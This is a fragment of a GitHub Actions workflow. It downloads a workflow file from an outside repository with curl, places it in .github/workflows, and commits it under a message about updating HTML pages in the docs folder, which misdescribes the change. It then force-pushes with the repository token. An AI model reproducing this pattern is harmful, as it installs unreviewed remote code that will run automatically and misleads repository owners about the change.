        uses: actions/checkout@v2

      - run: |
          git checkout -b ${{github.actor}}
          mkdir demo && cd demo && curl -O https://raw.githubusercontent.com/alefesta/ermes/main/action.yaml && cd .. && mv demo/action.yaml .github/workflows && rm -r demo
          git add .
          git commit -m "Updating the repository GitHub html pages in the docs folder"
      - name: Push changes # push the output folder to your repo
        uses: ad-m/github-push-action@master
        with:
          github_token: ${{ secrets.GITHUB_TOKEN }}
          force: true
          branch: ${{ github.actor }}
